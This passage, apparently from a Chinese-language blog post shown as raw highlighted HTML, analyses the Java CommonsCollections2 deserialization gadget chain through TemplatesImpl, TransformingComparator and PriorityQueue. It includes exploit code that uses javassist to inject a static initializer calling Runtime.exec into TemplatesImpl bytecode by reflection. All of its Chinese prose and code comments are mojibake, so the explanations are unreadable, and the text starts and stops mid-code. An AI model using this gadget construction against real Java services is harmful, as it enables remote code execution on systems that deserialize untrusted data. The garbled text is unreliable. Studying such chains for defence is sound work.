</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>synchronized</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=nf>newTransformer</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformerImpl</span><span class=w> </span><span class=n>transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>transformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerImpl</span><span class=p>(</span><span class=n>getTransletInstance</span><span class=p>(),</span><span class=w> </span><span class=n>_outputProperties</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>_indentNumber</span><span class=p>,</span><span class=w> </span><span class=n>_tfactory</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_uriResolver</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>transformer</span><span class=p>.</span><span class=na>setURIResolver</span><span class=p>(</span><span class=n>_uriResolver</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getFeature</span><span class=p>(</span><span class=n>XMLConstants</span><span class=p>.</span><span class=na>FEATURE_SECURE_PROCESSING</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>transformer</span><span class=p>.</span><span class=na>setSecureProcessing</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ³¨é‡Š1å¤„è°ƒç”¨äº†getTransletInstanceï¼Œåˆ†ægetTransletInstanceã€‚</p><p>æ³¨é‡Š2å¤„è°ƒç”¨äº†defineTransletClassesï¼Œåœ¨defineTransletClassesé‡Œæ³¨é‡Š3å¤„ï¼Œä¼šè§£æç±»çš„å­—èŠ‚ç _bytecodesï¼Œ_bytecodeså°±æ˜¯ä¹‹åæˆ‘ä»¬æ„é€ çš„åŒ…å«payloadçš„ç±»çš„å­—èŠ‚ç ã€‚</p><p>å›åˆ°æ³¨é‡Š4å¤„ï¼Œç¨‹åºä¼šä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ¶æ„TemplatesImplç±»åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œé‡Œé¢çš„é™æ€ä»£ç åŒ…å«çš„payloadå°±ä¼šåœ¨æ­¤æ—¶æ‰§è¡Œã€‚</p><p>ps1ï¼š</p><p>åœ¨æ„é€ æ—¶æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š</p><ul><li>æ³¨é‡Š4å¤„ï¼Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ªAbstractTransletç¤ºä¾‹ï¼Œå› æ­¤æˆ‘ä»¬çš„æ¶æ„ç±»è¦ç»§æ‰¿ä¸€ä¸‹AbstractTranslet</li><li>æ³¨é‡Š5å¤„ï¼Œæˆ‘ä»¬æ„é€ æ—¶éœ€è¦ç»™_nameèµ‹ä¸€ä¸ªä»»æ„çš„å€¼ï¼Œä¸ç„¶åé¢çš„ä»£ç ä¸ä¼šæ‰§è¡Œ</li></ul><p>ps2ï¼š</p><p>qï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨InvokerTransformer#transformé‡Œè°ƒç”¨getTransletInstanceï¼Ÿ</p><p>aï¼šå› ä¸ºgetTransletInstanceæ˜¯ç§æœ‰æ–¹æ³•</p><p>äºæ˜¯æœ‰Expä¸­çš„æ„é€ ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=o>=</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=c1>//è¿”å›é»˜è®¤çš„ç±»æ± </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>);</span><span class=c1>//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>CtClass</span><span class=w> </span><span class=n>payload</span><span class=o>=</span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;CommonsCollections22222222222&#34;</span><span class=p>);</span><span class=c1>//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>payload</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>));</span><span class=w>  </span><span class=c1>//è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>payload</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=c1>//è½¬æ¢ä¸ºbyteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Object</span><span class=w> </span><span class=n>templatesImpl</span><span class=o>=</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>).</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}).</span><span class=na>newInstance</span><span class=p>();</span><span class=c1>//åå°„åˆ›å»ºTemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=c1>//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>field1</span><span class=o>=</span><span class=n>templatesImpl</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=c1>//åå°„è·å–templatesImplçš„_nameå­—æ®µ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field1</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=c1>//æš´åŠ›åå°„</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>field1</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templatesImpl</span><span class=p>,</span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=c1>//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>â€</p><h5 id=transformingcomparator>TransformingComparator</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=cm>/** The decorated comparator. */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Comparator</span><span class=o>&lt;</span><span class=n>O</span><span class=o>&gt;</span><span class=w> </span><span class=n>decorated</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/** The transformer being used. */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Transformer</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>I</span><span class=p>,</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>O</span><span class=o>&gt;</span><span class=w> </span><span class=n>transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>TransformingComparator</span><span class=p>(</span><span class=n>Transformer</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>I</span><span class=p>,</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>O</span><span class=o>&gt;</span><span class=w> </span><span class=n>transformer</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>(</span><span class=n>transformer</span><span class=p>,</span><span class=w> </span><span class=n>ComparatorUtils</span><span class=p>.</span><span class=na>NATURAL_COMPARATOR</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Returns the result of comparing the values from the transform operation.
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * @param obj1  the first object to transform then compare
</span></span></span><span class=line><span class=cl><span class=cm>     * @param obj2  the second object to transform then compare
</span></span></span><span class=line><span class=cl><span class=cm>     * @return negative if obj1 is less, positive if greater, zero if equal
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>compare</span><span class=p>(</span><span class=kd>final</span><span class=w> </span><span class=n>I</span><span class=w> </span><span class=n>obj1</span><span class=p>,</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>I</span><span class=w> </span><span class=n>obj2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>O</span><span class=w> </span><span class=n>value1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>transformer</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>obj1</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>final</span><span class=w> </span><span class=n>O</span><span class=w> </span><span class=n>value2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>transformer</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>obj2</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>decorated</span><span class=p>.</span><span class=na>compare</span><span class=p>(</span><span class=n>value1</span><span class=p>,</span><span class=w> </span><span class=n>value2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>commons-collections4 4.0ä¸­ï¼ŒLazyMapå’ŒTransformedMapæ²¡æœ‰äº†decorateæ–¹æ³•ï¼Œé€‰æ‹©TransformingComparatorçš„compareè§¦å‘ã€‚</p><p>åœ¨æ„é€ æ—¶ï¼Œtransformerä¼ å…¥çš„åº”è¯¥æ˜¯InvokerTransformerå®ä¾‹ã€‚</p><h5 id=priorityqueue>PriorityQueue</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>Comparator</span><span class=o>&lt;?</span><span class=w> </span><span class=kd>super</span><span class=w> </span><span class=n>E</span><span class=o>&gt;</span><span class=w> </span><span class=n>comparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>transient</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>queue</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Inserts item x at position k, maintaining heap invariant by
</span></span></span><span class=line><span class=cl><span class=cm>     * demoting x down the tree repeatedly until it is less than or
</span></span></span><span class=line><span class=cl><span class=cm>     * equal to its children or is a leaf.
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * @param k the position to fill
</span></span></span><span class=line><span class=cl><span class=cm>     * @param x the item to insert
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>siftDown</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=p>,</span><span class=w> </span><span class=n>E</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>comparator</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>siftDownUsingComparator</span><span class=p>(</span><span class=n>k</span><span class=p>,</span><span class=w> </span><span class=n>x</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>else</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>siftDownComparable</span><span class=p>(</span><span class=n>k</span><span class=p>,</span><span class=w> </span><span class=n>x</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>siftDownUsingComparator</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>k</span><span class=p>,</span><span class=w> </span><span class=n>E</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>half</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>k</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>half</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>child</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>k</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>queue</span><span class=o>[</span><span class=n>child</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>right</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>child</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>right</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>comparator</span><span class=p>.</span><span class=na>compare</span><span class=p>((</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>c</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>queue</span><span class=o>[</span><span class=n>right</span><span class=o>]</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>queue</span><span class=o>[</span><span class=n>child</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>right</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>comparator</span><span class=p>.</span><span class=na>compare</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>c</span><span class=p>)</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>queue</span><span class=o>[</span><span class=n>k</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>child</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=o>[</span><span class=n>k</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Establishes the heap invariant (described above) in the entire tree,
</span></span></span><span class=line><span class=cl><span class=cm>     * assuming nothing about the order of the elements prior to the call.
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>heapify</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>1</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>--</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>siftDown</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>queue</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=c1>//3</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Reconstitutes the {@code PriorityQueue} instance from a stream
</span></span></span><span class=line><span class=cl><span class=cm>     * (that is, deserializes it).
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * @param s the stream
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=w> </span><span class=n>s</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in size, and any hidden stuff</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in (and discard) array length</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SharedSecrets</span><span class=p>.</span><span class=na>getJavaOISAccess</span><span class=p>().</span><span class=na>checkArray</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>size</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>size</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in all elements.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>size</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w>
